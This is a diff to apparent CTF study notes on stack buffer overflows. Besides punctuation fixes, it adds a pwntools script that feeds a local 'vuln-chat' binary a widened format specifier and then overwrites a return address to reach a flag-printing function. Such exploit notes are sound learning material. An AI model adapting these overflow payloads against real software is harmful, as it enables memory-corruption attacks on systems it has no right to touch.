@@ -1,10 +1,10 @@
 # Overwrite a Stack Value
 
-Examples of simple buffer owverflows to edit a stack value and get a shell or flag  
+Examples of simple buffer owverflows to edit a stack value and get a shell or flag.  
 
 ---
 
-A check is made to see if a stack value has changed after our input is received  
+A check is made to see if a stack value has changed after our input is received.  
 
 ```python3
 #!/usr/bin/env python3
@@ -48,7 +48,7 @@ io.recv()
 
 ---
 
-The flag is read from a file and stored on the stack. We can overwrite the address that is called to print to the screen  
+The flag is read from a file and stored on the stack. We can overwrite the address that is called to print to the screen.  
 
 ```python3
 from pwn import *
@@ -66,5 +66,30 @@ payload = junk + addr
 io.sendline(payload)
 
 # Win
+io.interactive()
+```
+
+---
+
+Overwrite a format specifier in the first input.  
+The second input overwrites a return address which you can point to a function that prints the flag.  
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+context.log_level="debug"
+
+io = process("./vuln-chat")
+
+payload1 = b"A" * 20
+payload1 += b"%99s"
+io.recvuntil("username: ")
+io.sendline(payload1)
+
+payload2 = b"A" * 49
+payload2 += p32(0x0804856b)
+io.recvuntil("But how do I know I can trust you?\n")
+io.sendline(payload2)
 io.interactive()
 ```
